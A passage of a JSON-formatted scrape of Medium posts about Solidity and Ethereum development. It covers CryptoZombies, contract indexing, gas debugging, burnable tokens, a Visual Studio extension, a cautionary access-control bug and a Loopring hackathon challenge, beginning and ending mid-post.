answer\u300d\u3092\u30af\u30ea\u30c3\u30af\u3059\u308c\u3070\u56de\u7b54\u304c\u898b\u3089\u308c\u307e\u3059\u3002\u3053\u306e\u3088\u3046\u306b\u3001\u521d\u6b69\u7684\u306a\u30d7\u30ed\u30b0\u30e9\u30df\u30f3\u30b0\u3092\u30a4\u30fc\u30b5\u30ea\u30a2\u30e0\u306eSolidity\u8a00\u8a9e\u3092\u4f7f\u3063\u3066\u8aac\u660e\u3057\u3066\u3044\u307e\u3059\u3002\u624b\u9806\u2464\uff1a\u89e3\u7b54\u304c\u6b63\u3057\u304b\u3063\u305f\u5834\u5408\u306f\u3001\u4ee5\u4e0b\u306e\u3088\u3046\u306b\u30be\u30f3\u30d3\u304c\u99c6\u3051\u629c\u3051\u3066\u3044\u304d\u307e\u3059\u3002GIF\u52d5\u753b\u3092\u53c2\u8003\u306b\u3001\u4e2d\u592e\u306b\u51fa\u73fe\u3057\u305f\u300cVictory\u300d\u3092\u30af\u30ea\u30c3\u30af\u3057\u6b21\u306e\u7ae0\u3078\u9032\u307f\u307e\u3057\u3087\u3046\u3002\u3053\u306e\u3088\u3046\u306b\u3001\u30d7\u30ed\u30b0\u30e9\u30df\u30f3\u30b0\u3092\u89e6\u308c\u305f\u3053\u3068\u306e\u3042\u308b\u65b9\u306b\u306f\u975e\u5e38\u306b\u7c21\u5358\u306b\u904a\u3079\u308b\u5185\u5bb9\u3067\u3059\u304c\u3001\u672a\u7d4c\u9a13\u8005\u306e\u65b9\u306b\u306f\u5c11\u3057\u96e3\u3057\u3044\u304b\u3082\u3057\u308c\u307e\u305b\u3093\u3002\u305d\u306e\u5834\u5408\u306f\u3001C ++\u3001Python\u3001JavaScript\u3092\u5b66\u7fd2\u3057\u3066\u307f\u308b\u3068\u826f\u3044\u3067\u3059\u3002\u500b\u4eba\u7684\u306b\u306f\u3001\u5192\u982d\u3067\u3082\u66f8\u304d\u307e\u3057\u305f\u304c\u3001iOS\u306eSwift\u3084Unity\u3067C#\u8a00\u8a9e\u3092\u4f7f\u3063\u305f\u3053\u3068\u306e\u3042\u308b\u65b9\u306b\u306f\u7c21\u5358\u306b\u30b3\u30fc\u30c7\u30a3\u30f3\u30b0\u3067\u304d\u308b\u3068\u601d\u3044\u307e\u3059\u3002\u30aa\u30d6\u30b8\u30a7\u30af\u30c8\u6307\u5411\u306b\u3042\u305f\u308b\u30af\u30e9\u30b9\u306b\u4f3c\u305fContract\u3001\u30e1\u30bd\u30c3\u30c9\u3084\u95a2\u6570\u306b\u3064\u3044\u3066\u306f\u3001\u3053\u3061\u3089\u306e\u3010\u30b3\u30f3\u30c8\u30e9\u30af\u30c8\u6307\u5411\u8a00\u8a9e\uff1aSolidity\u3011\u306b\u3082\u8aac\u660e\u304c\u3055\u308c\u3066\u3044\u308b\u306e\u3067\u3001\u4e00\u5ea6\u8aad\u3093\u3067\u307f\u3066\u304f\u3060\u3055\u3044\u3002\u305d\u306e\u5f8c\u3067\u3001\u30af\u30ea\u30d7\u30c8\u30be\u30f3\u30d3\u30fc\u30ba\uff08CryptoZombies\uff09\u306b\u6311\u6226\u3057\u3066\u307f\u308b\u3068\u9762\u767d\u304f\u30b9\u30de\u30fc\u30c8\u30b3\u30f3\u30c8\u306eSolidity\u8a00\u8a9e\u304c\u5b66\u3079\u307e\u3059\u3002\u6b21\u56de\u306f\u3001\u30b9\u30de\u30fc\u30c8\u30b3\u30f3\u30c8\u30e9\u30af\u30c8\u3068\u30b7\u30a7\u30a2\u30ea\u30f3\u30b0\u30a8\u30b3\u30ce\u30df\u30fc\u306b\u3064\u3044\u3066\u66f8\u3044\u3066\u3044\u304d\u307e\u3059\u3002\u30c6\u30af\u30ce\u30ed\u30b8\u30fc\u95a2\u9023\u8a18\u4e8b2018\u5e743\u670827\u65e5\u306b\u300c\u3010\u521d\u5fc3\u8005\u5165\u9580\u3011\u30d7\u30ed\u30b0\u30e9\u30df\u30f3\u30b0\u3092\u5b66\u3093\u3067\u611f\u3058\u305f\u304a\u3059\u3059\u3081\u30d7\u30ed\u30b0\u30e9\u30df\u30f3\u30b0\u5b66\u7fd2\u30b5\u30a4\u30c8\u300d\u306b\u3064\u3044\u3066\u66f8\u304d\u307e\u3057\u305f\u3002\u3010\u521d\u5fc3\u8005\u5165\u9580\u3011\u30d7\u30ed\u30b0\u30e9\u30df\u30f3\u30b0\u3092\u5b66\u3093\u3067\u611f\u3058\u305f\u304a\u3059\u3059\u3081\u30d7\u30ed\u30b0\u30e9\u30df\u30f3\u30b0\u5b66\u7fd2\u30b5\u30a4\u30c8\u6628\u4eca\u30d7\u30ed\u30b0\u30e9\u30df\u30f3\u30b0\u5b66\u7fd2\u306e\u30b5\u30fc\u30d3\u30b9\u3092\u63d0\u4f9b\u3059\u308b\u30b9\u30bf\u30fc\u30c8\u30a2\u30c3\u30d7\u304c\u52e2\u3044\u3092\u898b\u305b\u3066\u3044\u307e\u3059\u3002salestechnologylab.comFLOC\u30d6\u30ed\u30c3\u30af\u30c1\u30a7\u30fc\u30f3\u5927\u5b66\u6821\u30d6\u30ed\u30c3\u30af\u30c1\u30a7\u30fc\u30f3\u306b\u3064\u3044\u3066\u5b66\u3073\u305f\u3044\u65b9\u306f\u3053\u3061\u3089\u3002\u7121\u6599\u4f53\u9a13\u30b3\u30fc\u30b9 | FLOC\uff08\u30d5\u30ed\u30c3\u30af\uff09\u30d6\u30ed\u30c3\u30af\u30c1\u30a7\u30fc\u30f3\u5927\u5b66\u6821\uff5c\u4e16\u754c\u3092\u5909\u3048\u308b\u30d6\u30ed\u30c3\u30af\u30c1\u30a7\u30fc\u30f3\u3092\u5b66\u3073\u3001\u672a\u6765\u3092\u5275\u308b\u4ed5\u4e8b\u3092\u3059\u308b\u6700\u901f3\u30f5\u6708\u3067\u5b9f\u8df5\u7684\u306a\u30d6\u30ed\u30c3\u30af\u30c1\u30a7\u30fc\u30f3\u6280\u8853\u3092\u7fd2\u5f97\u3057\u3001\u30b3\u30fc\u30b9\u7d42\u4e86\u6642\u306b\u53d7\u3051\u308b\u30b9\u30ad\u30eb\u30c1\u30a7\u30c3\u30af\u3092\u3082\u3068\u306b\u3001\u6280\u8853\u8005\u3092\u5fc5\u8981\u3068\u3057\u3066\u3044\u308b\u4f01\u696d\u3068\u306e\u4eba\u6750\u30de\u30c3\u30c1\u30f3\u30b0\u3092\u884c\u3044\u307e\u3059\u3002www.tcs-asp.net\u51fa\u5178\uff1a[FLOC\u30d6\u30ed\u30c3\u30af\u30c1\u30a7\u30fc\u30f3\u5927\u5b66\u6821]FLOC\u30d6\u30ed\u30c3\u30af\u30c1\u30a7\u30fc\u30f3\u5927\u5b66\u6821\u3067\u306f\u6700\u901f3\u30f5\u6708\u3067\u5b9f\u8df5\u7684\u306a\u30d6\u30ed\u30c3\u30af\u30c1\u30a7\u30fc\u30f3\u6280\u8853\u3092\u7fd2\u5f97\u3057\u3001\u30b3\u30fc\u30b9\u7d42\u4e86\u6642\u306b\u53d7\u3051\u3089\u308c\u308bCDLT\uff08Certification for Distributed Ledger Technology\uff09\u306b\u3088\u308b\u30b9\u30b3\u30a2\u30ea\u30f3\u30b0\u3092\u3082\u3068\u306b\u3001\u6280\u8853\u8005\u3092\u5fc5\u8981\u3068\u3057\u3066\u3044\u308b\u4f01\u696d\u3068\u306e\u4eba\u6750\u30de\u30c3\u30c1\u30f3\u30b0\u3092\u884c\u3044\u307e\u3059\u3002\u51fa\u5178\uff1a[FLOC\u30d6\u30ed\u30c3\u30af\u30c1\u30a7\u30fc\u30f3\u5927\u5b66\u6821]]5\u3064\u306e\u30dd\u30a4\u30f3\u30c8(1)\u6700\u901f3\u30f5\u6708\u3067\u30d6\u30ed\u30c3\u30af\u30c1\u30a7\u30fc\u30f3\u6280\u8853\u3092\u7fd2\u5f97(2)\u30d6\u30ed\u30c3\u30af\u30c1\u30a7\u30fc\u30f3\u6280\u8853\u306e\u30b9\u30ad\u30eb\u30a2\u30c3\u30d7(3)\u6700\u5148\u7aef\u306e\u6280\u8853\u7fd2\u5f97\u3067\u30ad\u30e3\u30ea\u30a2\u30a2\u30c3\u30d7(4)\u5b9f\u7e3e\u306e\u3042\u308b\u30a8\u30f3\u30b8\u30cb\u30a2\u304b\u3089\u76f4\u63a5\u5b66\u3079\u308b(5)\u72ec\u81ea\u306e\u30b9\u30ad\u30eb\u30c1\u30a7\u30c3\u30af\u5236\u5ea6\u30a8\u30f3\u30b8\u30cb\u30a2\u3001 \u8d77\u696d\u5bb6\u30fb\u4f1a\u793e\u54e1\uff08\u30d6\u30ed\u30c3\u30af\u30c1\u30a7\u30fc\u30f3\u3092\u6d3b\u7528\u3057\u305f\u81ea\u793e\u30b5\u30fc\u30d3\u30b9\u306e\u63d0\u6848\u3092\u884c\u3044\u305f\u3044\u4eba\uff09\u7537\u5973\u554f\u308f\u305a\u5fdc\u52df\u304c\u53ef\u80fd\u3067\u3059\u3002\u51fa\u5178\uff1a[FLOC\u30d6\u30ed\u30c3\u30af\u30c1\u30a7\u30fc\u30f3\u5927\u5b66\u6821]Twitter\u306f\u3053\u3061\u3089\u2192@sato__yusuke\u30d3\u30c3\u30c8\u30b3\u30a4\u30f3\u3084CoinTip\u3067\u300c\u6295\u3052\u92ad\u300d\u3092\u3057\u3066\u3044\u305f\u3060\u3051\u308b\u3068\u559c\u3073\u307e\u3059\u3002\u30d3\u30c3\u30c8\u30b3\u30a4\u30f3\u3067\u5bc4\u4ed8\u3057\u305f\u3044\u91d1\u984d\u3092\u9078\u3093\u3067\u304f\u3060\u3055\u3044\u3002\u2192 \u3010\u3053\u3061\u3089\u3092\u30af\u30ea\u30c3\u30af\u3011IndieSquare Wallet\u3092\u30b9\u30de\u30db\u306b\u30a4\u30f3\u30b9\u30c8\u30fc\u30eb\u3057\u3001\u4e8b\u524d\u306b\u5bc4\u4ed8\u3057\u305f\u3044\u91d1\u984d\u4ee5\u4e0a\u306e\u30d3\u30c3\u30c8\u30b3\u30a4\u30f3\u3092IndieSquare Wallet\u306b\u30c1\u30e3\u30fc\u30b8\u3057\u3066\u304a\u304f\u5fc5\u8981\u304c\u3042\u308a\u307e\u3059\u51fa\u5178\uff1aCoin Tip\u3010\u30d3\u30c3\u30c8\u30b3\u30a4\u30f3\u3011\u3092Twitter\u3067\u9001\u308b\u30b5\u30fc\u30d3\u30b9CoinTip", "responses": 0, "tags": ["Bitcoin", "Ethereum", "\u30b9\u30de\u30fc\u30c8\u30b3\u30f3\u30c8\u30e9\u30af\u30c8", "Technology", "Dapps"]}, {"title": "Indexing Your Solidity Smart Contracts", "post_link": "https://medium.com/@blockapps/indexing-your-solidity-smart-contracts-fc72880776e2?source=search_post", "author_name": "BlockApps", "author_link": "https://medium.com/@blockapps", "publish_date": "2017-08-02", "last_modified_date": "2018-05-10", "readtime": "2.12", "claps": 8, "voters": 7, "content": "Indexing Your Solidity Smart ContractsBlockAppsFollowAug 2, 2017 \u00b7 3 min readWe\u2019ve now integrated the dashboard with our Smart Contract reporting engine Cirrus. Managing lots of contract states can become tedious as the number of smart contracts you\u2019ve deployed grows. With cirrus we expose a RESTful API that allows you to search through your smart contracts with simple query parameters.To try out this new feature set up a local installation with our developer trial, or spin up an instance on AzureNext create a new user.Then navigate to the contracts tab and create a smart contract.For this example I\u2019ll be using the trusty SimpleStorage.sol smart contractWhen uploading the contract you will notice you have an option to make the contract searchable. Under the hood what this means is that Cirrus will watch for instances of this contract being deployed and index their state.Let\u2019s go ahead and upload 3 instances of this contract. You should now see a screen that looks something like this.3 SimpleStorage.sol Smart Contracts have been uploadedIf you click on an instance of your smart contract, you can call its methods straight from the UI. I\u2019m going to set my storage contracts to have values of 1, 10 & 100 respectively.Call smart contract methods from the dashboard UINow let\u2019s navigate to the query builder and search for SimpleStorage contracts with the value set to 10 or greater. To do this simply select the field and the type of comparison operator you would like to use. In this case I\u2019m using storedData which is the name of the storage variable in my simple storage contract and less than or equal to 10Once you\u2019ve fired off the query you can see that query URL used to fetch the data, http://localhost/cirrus/search/SimpleStorage?storedData=gte.10It\u2019s that simple. Under the hood this endpoint uses PostgREST to generate the API. Anything PostgREST supports you can use here. Give the tool a try and let us know what you think!", "responses": 1, "tags": ["Ethereum", "Solidity", "Blockchain", "Rest Api"]}, {"title": "Our Blockchan Architect teaches \u201cEthereum & Solidity\u201d during Blockchain Delhi", "post_link": "https://medium.com/aave/our-blockchan-architect-teaches-about-ethereum-solidity-during-blockchain-delhi-aa4500eea47e?source=search_post", "author_name": "Nolvia Serrano", "author_link": "https://medium.com/@nolviaserrano", "publish_date": "2018-04-16", "last_modified_date": "2018-05-05", "readtime": "1.16", "claps": 152, "voters": 5, "content": "Our Blockchan Architect teaches \u201cEthereum & Solidity\u201d during Blockchain DelhiNolvia SerranoFollowApr 16, 2018 \u00b7 2 min readSharing Knowledge | On April 12, our Blockchain Architect, Jitendra Chittoda was invited to give a session on \u201cIntroduction to Ethereum & Solidity\u201d during Blockchain Delhi Conference . Jitendra was excited to share knowledge with blockchain enthusiasts and thrilled to meet with ETHLend supporters from the local area.Blockchain Delhi Conference brought together the experts in the field of cryptocurrency and blockchain technology. Top industry professionals and specialists joined to interact with attendees and present their thoughts and knowledge on the concepts of the latest buzzword, Blockchain.Developers community from Delhi and nearby areas participated in the conference and were enthusiastic of learning about this technology and decentralized applications. Participants were ranging from students to experienced professionals.Blockchain DelhiBlockchain Delhi Conference is organized by C# Corner & Stratis platform. Every year C# Corner hosts the developer conference in Delhi partnering with Stratis platform. C# Corner has over a million developers registered with them.", "responses": 0, "tags": ["Blockchain", "Ethereum", "Delhi", "Fintech", "About"]}, {"title": "Solidity Lesson: Don\u2019t be like this", "post_link": "https://medium.com/@nuuneoi/solidity-lesson-dont-be-like-this-e82b6eed6caf?source=search_post", "author_name": "Sittiphol Phanvilai", "author_link": "https://medium.com/@nuuneoi", "publish_date": "2018-06-15", "last_modified_date": "2018-06-17", "readtime": "0.31", "claps": 25, "voters": 6, "content": "Solidity Lesson: Don\u2019t be like thisSittiphol PhanvilaiFollowJun 15, 2018 \u00b7 1 min readEthereum Smart Contract source code is always visible to the public so whenever there is a bug on it, it is pretty hard to limit the damage, for example, \u2026modifier onlyFromWallet {  require(msg.sender != walletAddress);  _;}This is not a joke but literally from a real case. Really sorry for those who got affected from that != operator. I will not mention the name but well \u2026 what that just happened is just super awful.", "responses": 0, "tags": ["Ethereum", "Solidity", "Bug"]}, {"title": "Solidity: A quick and dirty way to debug gas usage", "post_link": "https://medium.com/@davesumter/solidity-a-quick-and-dirty-way-to-debug-gas-usage-962a1d8a4e?source=search_post", "author_name": "Dave Sumter", "author_link": "https://medium.com/@davesumter", "publish_date": "2018-01-24", "last_modified_date": "2018-05-17", "readtime": "1.36", "claps": 20, "voters": 5, "content": "Solidity: A quick and dirty way to debug gas usageDave SumterFollowJan 24, 2018 \u00b7 2 min readI just wanted to share a technique I\u2019ve been using to measure gas usage in calls. As the title says, it\u2019s quick and dirty, but is really easy to use. This is obviously only used for debugging and must be removed in your production code. Here goes:1) add this event:event Gas(uint step, uint num);2) add this to the top of your function// GAS DEBUGGING \u2014 REMOVE IN PRODUCTION uint p; uint g = msg.gas;3) add this after each step in your code (increment the step number if you want)// GAS DEBUGGING p = msg.gas; Gas(1, g-p-7); g = msg.gas; \u2026 // GAS DEBUGGINGp = msg.gas; Gas(2, g-p-7); g = msg.gas;A note on what\u2019s happening here:we\u2019re creating an event that just logs a step number and a gas number.we set up some variables to hold the gas remaining amount at the start and end of each step.we take readings between each step and fire the event.you need to take the readings before and after the event otherwise they won\u2019t be accurate (the event and readings themselves use gas).7 seems to be the gas used in taking the readings currently, so this compensates for them (if you get a large reading eg. 2354\u2026.54736 then it has overflowed and 7 is too high)Please note this debugging will increase the total gas used in your calls while you are using it, so use it temporarily and then remove it. It\u2019s a great way to check packing is working, local assignments, etc.Here\u2019s a full working example:pragma solidity ^0.4.19;contract gas_test {    event Gas(uint step, uint num);        uint test_variable;        function test() public     {                 // GAS DEBUGGING        uint p; uint g = msg.gas;                         // GAS DEBUGGING        p = msg.gas; Gas(1, g-p-7); g = msg.gas;                test_variable = 1;                     // +- 20k gas                // GAS DEBUGGING        p = msg.gas; Gas(2, g-p-7); g = msg.gas;                var local_variable = test_variable;    // +- 200 gas                // GAS DEBUGGING        p = msg.gas; Gas(3, g-p-7); g = msg.gas;            }}", "responses": 0, "tags": ["Ethereum", "Solidity"]}, {"title": "Live Coding Solidity in Unity", "post_link": "https://medium.com/@kende/live-coding-solidity-in-unity-c819510c110c?source=search_post", "author_name": "Jason Kende", "author_link": "https://medium.com/@kende", "publish_date": "2017-08-29", "last_modified_date": "2018-03-16", "readtime": "3.13", "claps": 34, "voters": 4, "content": "Live Coding Solidity in UnityJason KendeFollowAug 29, 2017 \u00b7 4 min readA 26 week livestreaming project.If you were plopped back in 1992 and told in the next 25 years that every industry on earth, along with the way 7 billion people live will change entirely, what would you do?Would you learn how to master the technologies that will come to eat and run the world?Blockchain is the future of how we store, validate, and distribute information. It\u2019s how we bring the power of the internet into the programming of money. And it\u2019s not going to take 25 years. It\u2019s here today.Wait, we\u2019re building what??A live programming environment for blockchain development in 3d & VR. Made with Unity, used to learn and code Solidity, in a fully visual space.We decided the future we were promised can\u2019t wait any longer. So we\u2019re doing what any self respecting xennial & millennial duo would: Building it ourselves, live, on the internet.Maybe we\u2019re crazy enough to believe this will actually work, and maybe we just think this is a great way to gain deeper mastery of multiple skills at once.Why are we studying Unity?The hardest part of blockchain and cryptocurrency development is how few people understand it. It\u2019s abstract as fuck.Unity is the industry leading physics engine for game, film, VR, and mobile application development. They even have an open source project for creating VR experiences from within VR!We needed a tool that could make complex things simple to understand, in a digital visual space.For us, the choice was easy.And why are we doing it live?Maybe it\u2019s a personality quirk. RGBubs & I both love to go into the hardest part of any puzzle, problem, or project first. Once that\u2019s solved, we know the rest will fall neatly into place.And in case you didn\u2019t know, livestreaming is huge.Lovers In A Dangerous SpacetimeBut why this hypervisual approach to code?It\u2019s the same impulse really. Identify the hardest thing the people you are trying to serve are experiencing and solve that with them first.Enough people understand now that blockchain, cryptocurrencies, and a confusing mix of other tech trends are really important, make a lot of money for the people who do things with them, and are becoming unavoidable. But how many understand what any of it means or how they actually do what they do?We\u2019re obsessed with live video, 3d immersive environments, and alternate digital realities using AR and VR inside of studio spaces filled with super specialized equipment, because we were the kids sitting inches from the screen playing our video games eyes glued to the action, no matter how many times we were told not to. We watch more Youtube than you want to know. And, most of all, because these are expensive tools that very few people have access to and it really only make sense to use them in specific situations.When a thing is super simple and already well understood by mainstream audiences, then stick to the most proven communication technology on the planet \u2014 basic text and touchable images on a mobile screen. But when you need to understand a hyper complex new cluster of technologies that no one alive today can afford to ignore, we need to be able to see it, feel it, touch it, interact with it, and explore it to really get it.That\u2019s what we\u2019re here to do.Come learn along with us for this 26 week journey into mastery, and hopefully we can teach each other a few unexpected things along the way.You can watch us live, every Tuesday and Thursday from 4pm to 5:30pm (Eastern).On Twitch:On YouTube:rgbubsStreaming games, 3D art, graphic design and more! And once I reach 100 followers on YouTube OR Twitch, I'll be adding a\u2026bit.lyWith frequent special guests you won\u2019t want to miss!Did you know you can clap for us multiple times on Medium now?Let\u2019s see how high we can get, together \ud83d\udc4f \ud83d\udc4f \ud83d\udc4fAnd become a patron on Patreon so we can make more content like this.Liminal is creating content and resources for creators | PatreonBecome a patron of Liminal today: Read posts by Liminal and get access to exclusive content and experiences on the\u2026patreon.comRGBubs is creating live streaming videos of games, tech, & design | PatreonBecome a patron of RGBubs today: Read posts by RGBubs and get access to exclusive content and experiences on the world\u2026patreon.comidlebright is creating livestream tours of experimental realities | PatreonBecome a patron of idlebright today: Read posts by idlebright and get access to exclusive content and experiences on\u2026patreon.com", "responses": 0, "tags": ["Virtual Reality", "Live Streaming", "YouTube", "Twitch", "Blockchain"]}, {"title": "How to Create a Burnable Token with Solidity and OpenZeppelin Library", "post_link": "https://medium.com/crowdbotics/how-to-create-a-burnable-token-with-solidity-and-openzeppelin-library-38bd3249d0c7?source=search_post", "author_name": "Gaurav Agrawal", "author_link": "https://medium.com/@gaurav.agrawal", "publish_date": "2018-11-06", "last_modified_date": "2019-06-12", "readtime": "2.90", "claps": 6, "voters": 4, "content": "How to Create a Burnable Token with Solidity and OpenZeppelin LibraryToken burning increases token value as it decreases the total supply. Here\u2019s how it works, and how to create your own burnable token with OpenZeppelin LibraryGaurav AgrawalFollowNov 6, 2018 \u00b7 3 min readRecapIn a previous tutorial, we created and created a capped a timebound crowdsale. Now, we review how to create a \u201cburnable token\u201d.What is token burning?Token burning implies to reducing the total supply of tokens.But wait, blockchains are immutable. So, how do we do this?Making a burnable token is accomplished by sending tokens to an address whose private keys are not accessible by anyone and subtracting the number from the total supply in our contract.We will continue to build our ExampleToken.sol, which we used in our previous tutorials.Let\u2019s dive into the code:ExampleToken.solFor this tutorial, we are removing thtoken minting feature from our contract and giving it a fixed total supply of 10000. OpenZeppelin library provides BurnableToken.sol. We will import this contract to implement burnable token functionality in our ExampleToken.pragma solidity ^0.4.23;import \"./BasicToken.sol\";contract BurnableToken is BasicToken {event Burn(address indexed burner, uint256 value);  function burn(uint256 _value) public {    _burn(msg.sender, _value);  }function _burn(address _who, uint256 _value) internal {    require(_value <= balances[_who]);balances[_who] = balances[_who].sub(_value);    totalSupply_ = totalSupply_.sub(_value);    emit Burn(_who, _value);    emit Transfer(_who, address(0), _value);  }}BurnableToken exposes burn(uint256 _value) method which is calling an internal _burn(address _who, uint256 _value) method. This internal method is performing the following tasks.Reducing the sender\u2019s token balance \u2014 It will reduce the token balance of the account who is executing the transaction. msg.sender is a global variable which represents the account who is executing the transaction.Reducing the token\u2019s total supply \u2014 Then the method is reducing the total supply of our token by changing the value of _totalSupply variable available in BasicToken.solEmitting Transfer event \u2014 This point is noteworthy, as you can see there is no actual transfer to address(0). It\u2019s just emitting an event which shows token is transferred to address(0). This achieves the same results as we are reducing the total supply. Also, if you check the transfer method in BasicToken.sol, you will see that we have a check that restricts anyone to send tokens to address(0).What is address(0)?This represents 0x0000000000000000000000000000000000000000 on ethereum blockchain. It\u2019s also the ethereum genesis address and no-one has its private keys. (You can check how much this address worth.)Making ExampleToken burnableNow, let's see how to implement this on our exampleToken contract.contract ExampleToken is  StandardToken, DetailedERC20, BurnableToken{  constructor(string _name, string _symbol, uint8 _decimals)   DetailedERC20(_name, _symbol, _decimals)  public {   totalSupply_ = 10000;   balances[msg.sender] = 10000;  }}We just need to inherit BurnableToken.sol. That\u2019s it, this will give us full functionality of to burn tokens.As mentioned earlier, we are setting total supply to 10000 and giving it to the person who is deploying our ExampleToken contract.Testing Burnable ExampleTokenOpenZeppelin library is well tested, so we will just add a basic test case to see that everything is working as expected.it('Burn test' , async() => {    await this.token.burn(1000);   const totalSupply = await this.token.totalSupply();   console.log(totalSupply);  assert.equal(totalSupply , 9000); });As you can see, we are burning 1000 tokens and checking if our token supply is now reduced to 9000. You can write more test cases of you own if you\u2019d like. If you need a reference, check my GitHub repository.ConclusionSo we have learned how to create a burnable token using OpenZeppelin library.Token burning is standard practice. It increases the token value as it decreases the Total supply. Coins like BNB (Binance coin) use token burning to increase the value of tokens.In the next part, we will see how to smart contract to pay dividends to token holders. If you have any questions, let us know in comments.You can check, the whole code in my GitHub repository.Starting a new blockchain project, or looking for a Solidity developer?Crowdbotics helps business build cool things with Solidity (among other things). If you have a blockchain project where you need additional developer resources, drop us a line. Crowbotics can help you estimate build time for given product and feature specs, and provide specialized Solidity developers as you need them. If you\u2019re building with Solidity, check out Crowdbotics.", "responses": 1, "tags": ["Smart Contracts", "Tutorial", "Openzeppelin", "Solidity", "Blockchain"]}, {"title": "Solidity Integration with Visual Studio", "post_link": "https://media.consensys.net/solidity-integration-with-visual-studio-7f25ea1bde71?source=search_post", "author_name": "ConsenSys", "author_link": "https://media.consensys.net/@ConsenSys", "publish_date": "2016-04-01", "last_modified_date": "2018-06-14", "readtime": "5.12", "claps": 4, "voters": 3, "content": "Solidity Integration with Visual StudioGetting Started with SolidityConsenSysFollowApr 1, 2016 \u00b7 6 min readOn March 30, 2016 we proudly announced the integration of Solidity and the Smart Contracts that work with Ethereum blockchains into Visual Studio. This exists as an extension that is available here. This extension was designed to lower the bar to working with blockchains and make this a seemless process from inside the world class IDE.The extension is free, and we have put together some steps to further help you get started using this.PrerequisitesTo get started you will need to be using Visual Studio 2015 Community, Professional, or Enterprise edition. You will also need to download the Solidity extension from the Visual Studio Marketplace. You can download that here. After installing the extension, you will need to restart Visual Studio. Also, nodejs will need to be installed to allow local deployments for development. This can be downloaded here. (download the latest LTS version)Create your first Decentralized ApplicationAfter the extension has been installed, next you can create a decentralized application that will be used to author, compile and deploy smart contracts.From the File menu, click new Project.2. In the New Project dialog box, click on Solidity under Installed Templates, and then select DecentralizedApplication. Name the application, MyDecentralizedApp, and then click OK.3. Next you will see a few things happened. A README document was opened in the Visual Studio main window and the project was setup with some folder and sample files. The README explains how to setup a local keyserver in order to deploy smart contracts to a development blockchain instance.a. First download and install the latest version of bloc from Consensys. To do this, open a cmd prompt, navigate to a directly where you would like to install the keyserver and run the following command: npm install blockapps-blocb. Next create the instance of bloc from the core by running the command:bloc init. This will prompt you for some values that will be used the instance. Enter a name of your choice, and user name, and accept the default for the apiUrl. This is the ethereum node that will hold the actual blocks that your account/contracts will be deployed to.c. Now change to that directory and install the required node packages by running the following command: cd <appname> && npm installd. Finally you are ready to start the bloc instance by running the following command: bloc start4. Now we have a keyserver running. This local keyserver will run on port 8000 by default. The Visual Studio extension is configured to use this server by default, with a user named: testuser and a password: testing. You can view and edit these changes by running the following:a. Right click the project in solution explorer.b. The dialog here shows the configuration values that are set by default, and can be adjusted if needed. (they will not need to be adjusted in most cases)5. At this point we have a keyserver running locally, now we have an endpoint that we can deploy our smart contracts to (as well as create new users). So now we can get started with development of smart contracts.Working with Smart Contracts (authoring, compiling, deploying)Now that the foundation is place, we can take a look at working with Smart Contracts. By default a folder named samples will be created with some sample contracts already included. When you are just getting started with Solidity, these are a great source of reference.To get started, we can use the Payout.sol smart contract. First, we can examine the contract in the Visual Studio code window. When we are satisified with what we have authored, we can then compile this contract. This compiliation will take place on the local machine. The output from the compliation will be in the output window of Visual Studio,Compilation1. Compile the smart contract2. The output for the compilation is found in the output window. If you don\u2019t see the output window in the lower part of your screen you can open from the View -> Output menu (or Ctrl + W, O). If there any errors with the compilation, it will be shown in the output window as well.DeploymentThe deployment is nearly as simple as the compilation. The deployment will send the smart contract to your local keyserver which will communicate with the underlying blockchain. What is actually happening is this.1. First, VS will use the project properties (shown earlier) to determine the bloc server to communicate with (url).2. Next VS will call this server, asking if the user in the project properties, exists.a. If it does exist, the address of the user will be returned to Visual Studio.b. If it doesn\u2019t exist, a new user will be created, and that address will be returned to Visual Studio.3. Next, VS will get the source for the contract, along with the address of the user and post this to the bloc server.4. Finally, your default browser will be opened to a dynamically created html page of the smart contract that was deployed.5. When the browser opens, you can enter the password for the bloc server (default is testing).6. You can then exercise the contract. For example, you can send in a value in Ether by post 1 to the setup box.Next StepsAt this point, congratulations, you have now entered the blockchain universe! I will be posting some more tutorials to expand on this.Written by Cale Teeter, Senior Software Engineer, DX, Microsoft", "responses": 2, "tags": ["Blockchain", "Ethereum", "Microsoft", "Web Development", "Dapps"]}, {"title": "Hackathon Challenge: Build a Compiler for A Structured Data Definition Language for Solidity", "post_link": "https://medium.com/loopring-protocol/hackathon-challenge-build-a-compiler-for-a-structured-data-definition-language-for-solidity-fe50fefa3f96?source=search_post", "author_name": "Daniel Wang", "author_link": "https://medium.com/@loopring", "publish_date": "2018-09-04", "last_modified_date": "2019-08-15", "readtime": "3.26", "claps": 23, "voters": 3, "content": "Hackathon Challenge: Build a Compiler for A Structured Data Definition Language for SolidityDaniel WangFollowSep 4, 2018 \u00b7 4 min readLoopring is sponsoring CryptoBazar\u2019s upcoming September hackathon, and here is our Hackathon challenge: design a solidity struct definition language and build a compiler for it to help solidity-based smart contract to serialize and deserialize solidity structs.The ChallengeSolidity is a language for writing smart contracts on Ethereum platform. It offers a set of built-in types. When writing smart contract, people usually define their public/external API like this (example from Loopring Protocol 1.0):function submitRing(  address[2][] addressList,  uint[7][] uintArgsList,  uint8[2][] uint8ArgsList,  bool[] buyNoMoreThanAmountBList,  uint8[] vList,  bytes32[] rList,  bytes32[] sList,  address ringminer,  address feeRecepient) public;The issues are:Many of these parameters are optional, engineers at Loopring usually has to give these optional parameters their default values in a submitRing transaction. Therefore the optional parameters\u2019 default values do consume gas, we want to avoid it.There is a limit on the number of parameters each function can have. Therefore, in Loopring 1.0, we have to organize parameters of the same type into an array and give it a terrible name, such as uint8ArgsList. We want to name each parameter with its own desired name to make the code more readable.There is no backward compatibility if we change the method\u2019s parameters in a newer version.Expected SolutionWe learn from Google\u2019s Protocol Buffer (protobuf) and Facebook\u2019s thrift, and imagine we can define our domain models in a protobuf/thrift like language and write a compiler to generate a set of solidity files that contain our domain models in solidity struct as well as a serialization function to serialize the struct into a byte array (bytes) and a deserialization function to deserialize a bytes into the domain struct.Let\u2019s take the following struct in solidity as an example:struct SimpleOrder {  address   owner;  address   tokenS;  address   tokenB;  uint      amountS;  uint      amountB;  uint      validSince;  uint tokenSpendableS;  uint tokenSpendableFee;}function submitSimpleOrder (  address   owner,  address   tokenS,  address   tokenB,  uint      amountS,  uint      amountB,  uint      validSince,  uint tokenSpendableS,  uint tokenSpendableFee) {  SimpleOrder order = new SimpleOrder(    owner,    tokenS,    tokenB,    amountS,    amountB,    validSince,    tokenSpendableS,   tokenSpendableFee);  // ...}We expect that all fields are optional. We can define such a struct in a prosol language yet to be invented:// simple_order.prosolstructure SimpleOrder {  address   owner = 1;  address   